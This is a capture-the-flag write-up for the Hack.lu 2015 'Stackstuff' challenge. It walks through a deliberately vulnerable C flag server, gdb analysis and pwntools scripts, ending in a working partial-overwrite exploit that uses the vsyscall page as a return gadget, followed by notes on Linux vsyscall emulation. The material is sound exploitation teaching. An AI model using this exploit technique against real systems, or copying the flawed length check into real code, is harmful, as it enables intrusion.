---
title:      Hack.lu 2015 - Stackstuff 150
author:     Alessandro "q3_C0d3" Guagnelli + ocean
date:       2015-10-23 09:00:00
summary:    Stuck overflow with PIE
categories: Hack.lu 2015 Exploitable
tags:
 - Hack.lu 2015
 - Exploitable
 - Stack overflow
---
> Welcome to the Progressive Secure Coding course! Here, you will learn how to properly secure your software without making it too slow. For example, you should use C. And compile your code for 64bit, because then you don't need stack cookies, the pointers are random enough.
Test your attack on a box with Linux >=3.4!
Connect to school.fluxfingers.net:1514








This challenge provided us with the executable and the source code. Let's analyze the binary and see what we find out:
    
    $ file hackme
    hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped
    $ checksec.sh --file hackme
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   hackme

So, we have executable stack, no canary and PIE enabled. We don't have to decompile the executable, since we are given the source code, and we can easily find the vulnerability:
{% highlight C%}
// gcc -o hackme hackme.c -fPIE -pie -Wall -fomit-frame-pointer

#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1514

int negchke(int n, const char *err) {
  if (n < 0) {
    perror(err);
    exit(1);
  }
  return n;
}

char real_password[50];

int check_password_correct(void) {
  char buf[50] = {0};

  puts("To download the flag, you need to specify a password.");
  printf("Length of password: ");
  int inlen = 0;
  if (scanf("%d\n", &inlen) != 1) {
    // peer probably disconnected?
    exit(0);
  }
  if (inlen <= 0 || inlen > 50) {
    // bad input length, fix it
    inlen = 90;
  }
  if (fread(buf, 1, inlen, stdin) != inlen) {
    // peer disconnected, stop
    exit(0);
  }
  return strcmp(buf, real_password) == 0;
}

void require_auth(void) {
  while (!check_password_correct()) {
    puts("bad password, try again");
  }
}

void handle_request(void) {
  alarm(60);
  setbuf(stdout, NULL);

  FILE *realpw_file = fopen("password", "r");
  if (realpw_file == NULL || fgets(real_password, sizeof(real_password), realpw_file) == NULL) {
    fputs("unable to read real_password\n", stderr);
    exit(0);
  }
  fclose(realpw_file);

  puts("Hi! This is the flag download service.");
  require_auth();

  char flag[50];
  FILE *flagfile = fopen("flag", "r");
  if (flagfile == NULL || fgets(flag, sizeof(flag), flagfile) == NULL) {
    fputs("unable to read flag\n", stderr);
    exit(0);
  }
  puts(flag);
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], "reexec") == 0) {
    handle_request();
    return 0;
  }

  int ssock = negchke(socket(AF_INET6, SOCK_STREAM, 0), "unable to create socket");
  struct sockaddr_in6 addr = {
    .sin6_family = AF_INET6,
    .sin6_port = htons(PORT),
    .sin6_addr = /*IN6ADDR_LOOPBACK_INIT*/ IN6ADDR_ANY_INIT
  };
  int one = 1;
  negchke(setsockopt(ssock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)), "unable to set SO_REUSEADDR");
  negchke(bind(ssock, (struct sockaddr *)&addr, sizeof(addr)), "unable to bind");
  negchke(listen(ssock, 16), "unable to listen");

  signal(SIGCHLD, SIG_IGN); /* no zombies */

  while (1) {
    int client_fd = negchke(accept(ssock, NULL, NULL), "unable to accept");
    pid_t pid = negchke(fork(), "unable to fork");
    if (pid == 0) {
      close(ssock);
      negchke(dup2(client_fd, 0), "unable to dup2");
      negchke(dup2(client_fd, 1), "unable to dup2");
      close(client_fd);
      negchke(execl("/proc/self/exe", "reexec", NULL), "unable to reexec");
      return 0;
    }
    close(client_fd);
  }
}
{% endhighlight %}

In short, our service compares the password we enter with the real password read from the file, and if the password is correct it gives us the flag. I wonder if there's a way to skip that require_auth() function... Wait, are you sure that you really want to read 90 characters on a 50 characters buffer if the user supply a wrong password length? I thought we were here to learn secure coding, but an attacker can easily control the saved RIP and control the program flow!

# Analyzing the vulnerability

The following python script will send 90 characters to the service.
{% highlight python%}
from pwn import *

host = 'localhost'
port = 1514

conn = remote(host, port)
payload = cyclic(90)
conn.recvuntil('password: ')
conn.sendline('55')
raw_input()
conn.send(payload)
print conn.recv(4000)
{% endhighlight %}

To understand how many characters we have to push before the saved RIP, we're gonna need gdb. We will use it to connect to the service just after we send the payload to analyze the stack just before the check_password_correct() function returns:

    $ ps -a | grep exe
    8214 pts/1    00:00:00 exe
    $ sudo gdb attach 8214
    gdb-peda$ disas check_password_correct 
    Dump of assembler code for function check_password_correct:
    0x00007f4713575ed2 <+0>: sub    rsp,0x58
    [...]
    0x00007f4713575fa8 <+214>: call   0x7f4713575c80 <strcmp@plt>
    0x00007f4713575fad <+219>: test   eax,eax
    0x00007f4713575faf <+221>: sete   al
    0x00007f4713575fb2 <+224>: movzx  eax,al
    0x00007f4713575fb5 <+227>: add    rsp,0x58
    0x00007f4713575fb9 <+231>: ret
    
    gdb-peda$ b *check_password_correct + 231
    Breakpoint 1 at 0x7f4713575fb9
    gdb-peda$ continue

    Breakpoint 1, 0x00007f4713575fb9 in check_password_correct ()
    gdb-peda$ x/10gx $rsp
    0x7ffd46f25108: 0x6161617461616173  0x6161617661616175
    0x7ffd46f25118: 0x00007f98631f6177  0x00000000ffffffff
    0x7ffd46f25128: 0x00007ffd46f25101  0x00007ffd46f272b6
    0x7ffd46f25138: 0x0000000000000000  0x00007ffd46f252c8
    0x7ffd46f25148: 0x00007f98631f8469  0x00007ffd46f272b6

The first thing we notice here is that we overwrote the return address from check_password_correct with 0x6161617461616173, that is the hex for 'aaataaas'. Using cyclic_find we can easily understand how many characters we have to write before our forged RIP:

    >>> from pwn import *
    >>> unhex('6161617461616173')
    'aaataaas'
    >>> cyclic_find('saaa')
    72

So, we have to write 72 characters before the RIP.
We can also notice another thing: 0x7ffd46f25118 is very similar to the return address from the require_auth() function, but with the last 2 bytes being overwritten. We can easily verify this:

    gdb-peda$ disas handle_request
    Dump of assembler code for function handle_request:
    [...]
    0x00007f98631f807a <+160>: lea    rdi,[rip+0x3a7]        # 0x7f98631f8428
    0x00007f98631f8081 <+167>: call   0x7f98631f7bc0 <puts@plt>
    0x00007f98631f8086 <+172>: call   0x7f98631f7fba <require_auth>
    0x00007f98631f808b <+177>: lea    rsi,[rip+0x36d]        # 0x7f98631f83ff
    0x00007f98631f8092 <+184>: lea    rdi,[rip+0x3b6]        # 0x7f98631f844f
    0x00007f98631f8099 <+191>: call   0x7f98631f7cd0 <fopen@plt>
    0x00007f98631f809e <+196>: mov    QWORD PTR [rsp+0x40],rax
    0x00007f98631f80a3 <+201>: cmp    QWORD PTR [rsp+0x40],0x0
    0x00007f98631f80a9 <+207>: je     0x7f98631f80c5 <handle_request+235>
    [...]

Good! We're almost there! On the stack we have 0x00007f98631f6177, and we want to return to 0x00007f98631f808b, that is, just after out require_auth() function. We know that pages are aligned, so we know that the last 12 bits of the address where we want to jump to are fixed to 0x08b. We overwrite 16 bits, so we are left with 4 unknown bits... Well, I think that a little of brute force won't be so bad, after all. Anyway, we still have stuff on the stack (or should I say stackstuff?) that we want to get rid of. If only I could make a pop-ret here!


~q3_C0d3

# Looking for something useful

We know that PIE is enabled, so addresses are changing everytime, but after all we don't need that much: pop-ret ret-ret are enough. After a few hours of digging, I found something that could easily bring us to get that damn flag. Running a couple of time the executable and mapping memory sections, I found that the vsyscall memory area had its address fixed

    gdb-peda$ info proc mappings
    process 8329
    Mapped address spaces:

              Start Addr           End Addr       Size     Offset objfile
          0x7f9862c07000     0x7f9862dc7000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.21.so
          [...]
          0x7ffd46f80000     0x7ffd46f82000     0x2000        0x0 [vdso]
      0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

I hope that vsyscall has what we're looking for...

    gdb-peda$ X/20i 0xffffffffff600000
       0xffffffffff600000:  mov    rax,0x60
       0xffffffffff600007:  syscall 
       0xffffffffff600009:  ret    
       0xffffffffff60000a:  int3   
       0xffffffffff60000b:  int3   

Bingo! That's exactly what we need: a couple of syscall, and we're good to go.
The first idea was to return twice to 0xffffffffff600009 and then to our handle_request(), just after the require_auth() call.
Keep in mind that we have to bruteforce 16 bits.

After trying we noticed that using 0xffffffffff600009 as a gadget resulted in a segfault.
The reason for this odd behaviour is that starting from linux kernel 3.3/3.4 the vsyscall are emulated using a trap-based mechanism
see [SROP](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf), [LWN](http://lwn.net/Articles/446528/),
and [thisissecurity](http://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/) for more information.

Since we just need to move further the stack to do the partial overwrite we can just call the address of time(...)/gettimeofday(...)/getcpu(...).
We decided to use 0xffffffffff600000 (gettimeofday).
This is possible because in di/si we have an address in a writeable memory page which contains
password and input (more on this later).


{% highlight python%}
from pwn import *

host = 'school.fluxfingers.net'
port = 1514

target = p64(0xffffffffff600000)
payload = 'a' * 72 + 2 * target + '\x8b\x10'
for i in range(0, 16):
  try:
    conn = remote(host, port)
    conn.recvuntil('password: ')
    conn.sendline('55')
    conn.send(payload)
    print conn.recv(4000)
    break
  except:
    conn.close()
    continue
{% endhighlight %}

And we have the flag: flag{MoRE_REtuRnY_tHAn_rop}

## why and how does vsyscall emulation works
The need for vsyscall emulation is as described in the resources mentioned before 
you can see here [vsyscall_emu_64.S](https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_emu_64.S#L2)
that the vsyscall page contains the gadget we need.

Though a second look at how emulate_vsyscall is executed in
[emulate_vsyscall(...)](https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_64.c#L116)
shows us that a few security checks are in place:

{% highlight C %}
    vsyscall_nr = addr_to_vsyscall_nr(address);

    trace_emulate_vsyscall(vsyscall_nr);

    if (vsyscall_nr < 0) {
        warn_bad_vsyscall(KERN_WARNING, regs,
                  "misaligned vsyscall (exploit attempt or buggy program) -- look up the vsyscall kernel parameter if you need a workaround");
        goto sigsegv;
    }

    if (get_user(caller, (unsigned long __user *)regs->sp) != 0) {
        warn_bad_vsyscall(KERN_WARNING, regs,
                  "vsyscall with bad stack (exploit attempt?)");
        goto sigsegv;
    }
{% endhighlight %}

The author of this part of the kernel decided to mantain the same behaviour that a real vsyscall
would have passing a wrong address, issuing a SIGSEGV if the called address is not good.
As long as the ret instruction is emulated we're good to go:
{% highlight C %}
do_ret:
    /* Emulate a ret instruction. */
    regs->ip = caller;
    regs->sp += 8;
    return true;

sigsegv:
    force_sig(SIGSEGV, current);
    return true;
}
{% endhighlight %}

[addr_to_vsyscall(...)](https://github.com/torvalds/linux/blob/v4.1/arch/x86/kernel/vsyscall_64.c#L74)
will make sure that the emulated syscall is called starting at the alignment address and be one of the three defined syscalls.

{% highlight C %}
static int addr_to_vsyscall_nr(unsigned long addr)
{
    int nr;

    if ((addr & ~0xC00UL) != VSYSCALL_ADDR)
        return -EINVAL;

    nr = (addr & 0xC00UL) >> 10;
    if (nr >= 3)
        return -EINVAL;

    return nr;
}
{% endhighlight %}


The last part left to understand how this works is how intructions in the vsyscall area are "trapped",
to do this we need to look at [fault.c](https://github.com/torvalds/linux/blob/v4.1/arch/x86/mm/fault.c#L774)
which is responsible of handing faults, in particular the code which handles this is in the badarea_nosemaphore function.

Looks like there is a VMA set up for the emulated vsyscall which explain why you can see this page as r-xp in maps/trace,
but the actual physical page is setup via __set_fixmap:


{% highlight C %}
  if (vsyscall_mode != NONE)
        __set_fixmap(VSYSCALL_PAGE, physaddr_vsyscall,
                 vsyscall_mode == NATIVE
                 ? PAGE_KERNEL_VSYSCALL
                 : PAGE_KERNEL_VVAR);
{% endhighlight %}

{% highlight C %}
#define __PAGE_KERNEL_VSYSCALL      (__PAGE_KERNEL_RX | _PAGE_USER)
#define __PAGE_KERNEL_VVAR      (__PAGE_KERNEL_RO | _PAGE_USER)
{% endhighlight %}

This would explain why we are still able to read the page anyway but a fault gets generated by the mmu if we try to execute code from the vsyscall page in emulation mode.

Thanks to TheJH from FluxFingers (the author of the challenge) for his help on writing this part of the writeup!

~ ocean
